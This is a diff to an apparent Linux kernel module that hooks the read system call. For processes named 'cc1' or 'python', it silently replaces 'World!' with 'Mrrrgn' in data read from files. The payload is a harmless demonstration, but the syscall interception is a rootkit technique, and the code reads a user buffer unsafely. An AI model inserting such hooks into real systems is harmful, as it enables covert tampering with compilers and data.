@@ -32,7 +32,7 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
     long ret;
     ret = ref_sys_read(fd, buf, count);
 	
-    if (fd > 2) {
+    if (ret >= 6 && fd > 2) {
         /* We can find the current task name from the current task struct
          * then use that to decide if we'd like to swap out data
          * in the read buffer before returning to the user.
@@ -41,14 +41,21 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
          */
         if (strcmp(current->comm, "cc1") == 0 || 
             strcmp(current->comm, "python") == 0) {
-            char *substring = strstr(buf, "World!");
-            if (substring != NULL) {
-                substring[0] = 'M';
-                substring[1] = 'r';
-                substring[2] = 'r';
-                substring[3] = 'r';
-                substring[4] = 'g';
-                substring[5] = 'n';
+            long i;
+            for (i = 0; i < (ret - 6); i++) {
+                if (buf[i] == 'W' &&
+                    buf[i+1] == 'o' &&
+                    buf[i+2] == 'r' &&
+                    buf[i+3] == 'l' &&
+                    buf[i+4] == 'd' &&
+                    buf[i+5] == '!') {
+                    buf[i] = 'M';
+                    buf[i+1] = 'r';
+                    buf[i+2] = 'r';
+                    buf[i+3] = 'r';
+                    buf[i+4] = 'g';
+                    buf[i+5] = 'n';
+                }
             }
         }
     }
